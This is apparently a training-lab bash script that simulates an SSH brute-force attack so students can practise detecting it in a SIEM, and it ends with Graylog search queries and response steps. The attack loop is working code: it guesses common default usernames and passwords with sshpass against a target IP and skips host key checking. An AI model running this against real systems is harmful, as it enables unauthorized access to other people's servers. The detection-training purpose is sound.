#!/bin/bash
# Brute Force Attack Simulation
# Author: Lab Vuln
# Version: 1.0

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

function print_status() {
    echo -e "${BLUE}=== $1 ===${NC}"
}

function print_success() {
    echo -e "${GREEN}✅ $1${NC}"
}

function print_error() {
    echo -e "${RED}❌ $1${NC}"
}

function print_warning() {
    echo -e "${YELLOW}⚠️  $1${NC}"
}

print_status "BRUTE FORCE ATTACK SIMULATION"
echo "Lab Vuln - Scenario 1"
echo "Target: MAQ-3 (SSH Service)"
echo "Duration: 15-30 minutes"
echo ""

print_warning "This script simulates a brute force attack against SSH"
print_warning "This is for educational purposes only!"
echo ""

read -p "Do you want to continue? (y/N): " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    print_warning "Simulation cancelled by user."
    exit 0
fi

# Configuration
TARGET_IP="192.168.1.103"  # MAQ-3 IP
SSH_PORT="22"
ATTACK_DURATION=300  # 5 minutes
DELAY_BETWEEN_ATTEMPTS=2

# Common usernames and passwords
USERNAMES=("admin" "root" "user" "test" "guest" "administrator" "operator")
PASSWORDS=("admin" "password" "123456" "root" "test" "guest" "admin123" "password123")

print_status "CONFIGURATION"
echo "Target IP: $TARGET_IP"
echo "SSH Port: $SSH_PORT"
echo "Attack Duration: $ATTACK_DURATION seconds"
echo "Delay between attempts: $DELAY_BETWEEN_ATTEMPTS seconds"
echo ""

# Check if target is reachable
print_status "CHECKING TARGET ACCESSIBILITY"

if ping -c 1 $TARGET_IP > /dev/null 2>&1; then
    print_success "Target is reachable"
else
    print_error "Cannot reach target at $TARGET_IP"
    print_warning "Make sure MAQ-3 is running and accessible"
    exit 1
fi

# Check if SSH port is open
if nc -z $TARGET_IP $SSH_PORT 2>/dev/null; then
    print_success "SSH port is open"
else
    print_error "SSH port is not accessible"
    print_warning "Make sure SSH service is running on MAQ-3"
    exit 1
fi

print_status "STARTING BRUTE FORCE SIMULATION"
echo "This will generate multiple failed login attempts"
echo "Monitor SIEM for detection of the attack"
echo ""

# Create log file for this simulation
LOG_FILE="brute-force-simulation-$(date +%Y%m%d-%H%M%S).log"
echo "Brute Force Simulation Log" > $LOG_FILE
echo "Date: $(date)" >> $LOG_FILE
echo "Target: $TARGET_IP:$SSH_PORT" >> $LOG_FILE
echo "Duration: $ATTACK_DURATION seconds" >> $LOG_FILE
echo "" >> $LOG_FILE

# Start attack
print_status "EXECUTING ATTACK"

start_time=$(date +%s)
attempt_count=0
success_count=0

while [ $(($(date +%s) - start_time)) -lt $ATTACK_DURATION ]; do
    # Select random username and password
    username=${USERNAMES[$RANDOM % ${#USERNAMES[@]}]}
    password=${PASSWORDS[$RANDOM % ${#PASSWORDS[@]}]}
    
    attempt_count=$((attempt_count + 1))
    
    echo "Attempt $attempt_count: $username:$password" >> $LOG_FILE
    
    # Try SSH connection with timeout
    timeout 5 sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 $username@$TARGET_IP "echo 'test'" 2>/dev/null
    
    if [ $? -eq 0 ]; then
        print_success "SUCCESS: $username:$password"
        success_count=$((success_count + 1))
        echo "SUCCESS: $username:$password" >> $LOG_FILE
    else
        echo "FAILED: $username:$password" >> $LOG_FILE
    fi
    
    # Show progress
    elapsed=$(( $(date +%s) - start_time ))
    remaining=$((ATTACK_DURATION - elapsed))
    echo -ne "\rProgress: $elapsed/$ATTACK_DURATION seconds - Attempts: $attempt_count - Success: $success_count"
    
    sleep $DELAY_BETWEEN_ATTEMPTS
done

echo ""
echo ""
print_status "ATTACK SIMULATION COMPLETE"

# Summary
echo ""
print_status "ATTACK SUMMARY"
echo "Total attempts: $attempt_count"
echo "Successful logins: $success_count"
echo "Failed attempts: $((attempt_count - success_count))"
echo "Attack duration: $ATTACK_DURATION seconds"
echo "Log file: $LOG_FILE"

# Log summary
echo "" >> $LOG_FILE
echo "=== ATTACK SUMMARY ===" >> $LOG_FILE
echo "Total attempts: $attempt_count" >> $LOG_FILE
echo "Successful logins: $success_count" >> $LOG_FILE
echo "Failed attempts: $((attempt_count - success_count))" >> $LOG_FILE
echo "Attack duration: $ATTACK_DURATION seconds" >> $LOG_FILE

print_status "SIEM DETECTION INSTRUCTIONS"
echo ""
echo "To detect this attack in SIEM (Graylog), search for:"
echo ""
echo "1. SSH authentication failures:"
echo "   source:MAQ-3 AND message:\"authentication failure\""
echo ""
echo "2. Failed login attempts:"
echo "   source:MAQ-3 AND message:\"Failed password\""
echo ""
echo "3. Multiple failed attempts from same IP:"
echo "   source:MAQ-3 AND message:\"authentication failure\" | group by source_ip"
echo ""
echo "4. Brute force pattern detection:"
echo "   source:MAQ-3 AND message:\"authentication failure\" AND source_ip:\"$(hostname -I | awk '{print $1}')\""
echo ""

print_status "RESPONSE PROCEDURES"
echo ""
echo "1. Block source IP in firewall"
echo "2. Review SSH configuration"
echo "3. Enable key-based authentication"
echo "4. Implement rate limiting"
echo "5. Monitor for successful compromises"
echo ""

print_success "Brute force simulation completed!"
print_warning "Check SIEM for attack detection and response" 